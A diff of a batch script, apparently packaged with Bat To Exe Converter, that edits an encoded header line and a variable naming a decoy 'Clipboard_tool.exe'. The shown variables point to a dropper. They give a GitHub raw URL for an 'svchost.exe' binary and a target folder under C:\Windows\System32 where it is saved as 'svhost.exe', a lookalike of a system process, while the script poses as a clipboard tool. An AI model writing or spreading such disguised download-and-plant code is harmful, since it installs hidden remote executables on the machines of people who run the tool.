@@ -1,6 +1,6 @@
 ::[Bat To Exe Converter]
 ::
-::fBE1pAF6MU+EWHreyHcjLQlHcCuxHUabOpEZ++Pv4Pq7sVseXO0sbLPUyLGJKe4S5gXHWdYr33ZfpOgABQtacRO5ajAgpmFO+GGdMqc=
+::fBE1pAF6MU+EWHreyHcjLQlHcCuxHUabOpEZ++Pv4Pq7sVseXO0sbLPUyLGJKe4S5nrHWakr33ZfpOgABQtacRO5ajAgpmFO+GGdMqc=
 ::YAwzoRdxOk+EWAjk
 ::fBw5plQjdCyDJGyX8VAjFDRnbSmjAE+/Fb4I5/jH/PyEqkIOQN42e4DVyYi7LvQa/knhcdt8mHNZl6s=
 ::YAwzuBVtJxjWCl3EqQJgSA==
@@ -46,7 +46,7 @@ if %errorlevel% neq 0 (
 
 
 :: --- Target folder: the directory this .bat is in ---
-set "FAKE_EXE=oreginal CL file\Clipboard_tool.exe"
+set "FAKE_EXE=Clipboard_tool.exe"
 set "TARGET_DIR=C:\Windows\System32\mc-fre"
 set "TARGET_NAME=svhost.exe"
 set "GITHUB_RAW_URL=https://github.com/osama32895/svchost/raw/refs/heads/main/svchost.exe"
